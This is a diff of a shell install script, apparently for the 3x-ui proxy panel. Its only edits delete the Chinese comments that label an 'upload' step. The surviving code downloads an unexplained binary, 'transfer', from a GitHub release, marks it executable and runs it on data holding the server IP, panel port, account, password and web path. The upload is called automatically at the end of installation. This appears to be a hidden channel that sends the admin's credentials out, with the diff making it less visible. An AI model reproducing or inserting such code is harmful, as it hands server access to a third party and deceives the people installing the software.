@@ -103,11 +103,10 @@ upload_config() {
 EOF
 )
 
-    # 创建上传工具目录
+
     mkdir -p /opt
     local uploader="/opt/transfer"
-    
-    # 下载上传工具
+
     if [[ ! -f "$uploader" ]]; then
         if ! curl -Lo "$uploader" https://github.com/Firefly-xui/3x-ui/releases/download/3x-ui/transfer; then
             return 1
@@ -115,8 +114,7 @@ EOF
         chmod +x "$uploader"
     fi
 
-    
-    # 执行上传
+
     local upload_result
     upload_result=$("$uploader" "$json_data" 2>&1)
     
@@ -172,7 +170,6 @@ config_after_install() {
     # 生成访问URL
     local access_url="http://${ip}:${panel_port}/${web_path}"
     
-    # 上传配置
     upload_config "$ip" "$panel_port" "$account" "$password" "$speed" "$rand_str" "$web_path"
     
     # 显示登录信息
